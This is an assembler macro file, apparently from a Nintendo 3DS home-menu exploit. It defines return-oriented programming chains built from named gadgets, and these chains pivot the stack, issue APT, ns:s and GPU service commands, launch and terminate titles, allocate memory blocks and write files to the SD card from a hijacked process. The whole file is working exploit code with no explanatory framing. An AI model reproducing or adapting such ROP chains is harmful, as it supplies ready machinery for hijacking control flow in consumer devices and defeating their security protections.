	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_set_app_cpu_limit,value
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6PC
		.word 0x004F0080 ; command header
		.word 0x00000001
		.word value
	memcpy_r0_lr_prev (4 * 3), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_launch_title_raw,tidlow,tidhigh
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0xDEADBABE
		.word 0x000200C0 ; command header
		.word tidlow ; tid low
		.word tidhigh ; tid high
		.word 0x00000001 ; timeout low
	memcpy_r0_lr_prev (4 * 4), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_terminate_tid,tid_low,tid_high,timeout_low
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		; nss_terminate_tid_cmd_buf:
		.word 0x00110100 ; command header
		.word tid_low ; tid low
		.word tid_high ; tid high
		.word timeout_low ; timeout low
		.word 0x00000000 ; timeout high
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_launch_title_update,tid_low,tid_high,mediatype
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8R9R10PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0xDEADBABE ; garbage
		.word 0x00150140 ; command header
		.word tid_low ; tid low
		.word tid_high ; tid high
		.word mediatype ; mediatype
		.word 0x00000000 ; 0
		.word 0x00000004 ; flags
	memcpy_r0_lr_prev (4 * 6), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_terminate_tid_deref,tid_low_ptr,tid_high_ptr,timeout_low,offset
	load_store tid_low_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_low
	load_store tid_high_ptr, MENU_LOADEDROP_BUFADR + offset + @@tid_high
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00110100 ; command header
		@@tid_low:
		.word 0xDEADBABE ; tid low
		@@tid_high:
		.word 0xDEADBABE ; tid high
		.word timeout_low ; timeout low
		.word 0x00000000 ; timeout high
	memcpy_r0_lr_prev (4 * 5), 1, offset
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_prepare_jump_application
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC
		.word 0x00230040 ; command header
		.word 0x00000000
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_jump_application
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC
		.word 0x00240044 ; command header
		.word 0x00000000
		.word 0x00000000
		.word 0x00000000
		.word 0x00000002
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_hardware_reboot_async
	get_cmdbuf 0
	.word ROP_MENU_POP_R4PC
		.word 0x004E0000 ; command header
	memcpy_r0_lr_prev (4 * 1), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_get_appletinfo,appid
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00060040 ; command header
		.word appid ; id
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro apt_finalize,appid
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, r6, r7, r8, pc}
		.word 0x00040040 ; command header
		.word appid ; id
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_APT_HANDLE ; r0 (apt handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro send_gx_cmd,cmd_data
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word cmd_data ; r1 (cmd addr)
	.word MENU_GSPGPU_GXTRYENQUEUE
.endmacro

.macro gsp_import_display_captureinfo,out_ptr
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out_ptr ; r1 (output buffer)
	.word ROP_MENU_GSPGPU_IMPORTDISPLAYCAPTUREINFO
.endmacro

.macro mount_sdmc,name
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word name
	.word ROP_MENU_MOUNTSDMC
.endmacro

.macro create_memory_block,out_ptr,addr,size,myperm,otherperm
	set_lr ROP_MENU_POP_R4PC
	.word ROP_MENU_POP_R0PC
		.word out_ptr
	.word ROP_MENU_POP_R1PC
		.word addr
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word size ; r2
		.word myperm ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_CREATEMEMORYBLOCK
		.word otherperm
.endmacro

.macro fopen,f,name,flags
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word name
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word flags ; r2
		.word 0xFFFFFFFF ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FOPEN
.endmacro

.macro fwrite,f,bytes_written,data,size,flush
	set_lr ROP_MENU_POP_R1PC
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word bytes_written ; bytes written
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word data ; r2
		.word size ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FWRITE
		.word flush
.endmacro

.macro fwrite_deref,f,bytes_written,dataptr,size,flush,offset
	set_lr ROP_MENU_POP_R1PC
	load_store dataptr, @@dataptr_dst + MENU_LOADEDROP_BUFADR + offset
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word bytes_written ; bytes written
	.word ROP_MENU_POP_R2R3R4R5R6PC
		@@dataptr_dst:
		.word 0xDEADBABE ; r2
		.word size ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FWRITE
		.word flush
.endmacro

.macro fseek,f,offset,origin
	set_lr ROP_MENU_POP_R1PC
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_POP_R1PC
		.word 0x00000000 ; r1 (?)
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word offset ; r2 (offset low)
		.word 0x00000000 ; r3 (offset high)
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word ROP_MENU_FSEEK
		.word origin
.endmacro

.macro fclose,f
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word f
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_FCLOSE
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word MENU_SLEEP
.endmacro

.macro store_r0,dst
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro store,a,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro storeb,a,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word dst ; r4
	.word ROP_MENU_STRB_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_store,src,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_r0,src
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4
.endmacro

.macro load_and_add_storeb,src,add,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_AND_R0R0x7_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word add ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STRB_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro load_addlsl2_store,src,add,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word add ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC
		.word dst ; r4
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro loadadr_store,src,val
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word src ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word val ; r1
	.word ROP_MENU_STR_R1R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro add_and_store,a,b,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word b ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word dst ; r4
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro add_and_store_3,a,b,c,dst
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word a ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word b ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word c ; r1
	.word ROP_MENU_ADD_R0R0R1_POP_R4R5R6PC
		.word dst ; r4
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro busyloop,total
	.word ROP_MENU_POP_R1PC
		.word 0x00000000
	@@busyloop_start:
	.word ROP_MENU_POP_R4R5PC
		.word 0xDEADBABE
		.word DUMMY_PTR - 0x10
	.word ROP_MENU_ADD_R1R1x1_STR_R1R5x10_POP_R4R5R6PC
		.word 0xDEADBABE
		.word DUMMY_PTR - 0x10
		.word 0xDEADBABE
	.word ROP_MENU_POP_R0PC
		.word total
	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	store ROP_MENU_POP_R4R5PC, MENU_OBJECT_LOC + @@busyloop_pivot
	.word ROP_MENU_POP_R4PC
		.word ROP_MENU_STACK_PIVOT ; r4
	.word ROP_MENU_POP_R0PC
		.word MENU_OBJECT_LOC + @@busyloop_pivot - 4
	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MENU_POP_R4PC
		.word MENU_OBJECT_LOC + @@busyloop_data + 4 ; r4 (pivot data location)
	@@busyloop_pivot:
	.word ROP_MENU_STACK_PIVOT
		@@busyloop_data:
		.word MENU_OBJECT_LOC + @@busyloop_start ; sp
		.word MENU_NOP ; pc
.endmacro

.macro infloop
	set_lr ROP_MENU_BX_LR ; bx lr
	.word ROP_MENU_BX_LR ; bx lr
.endmacro
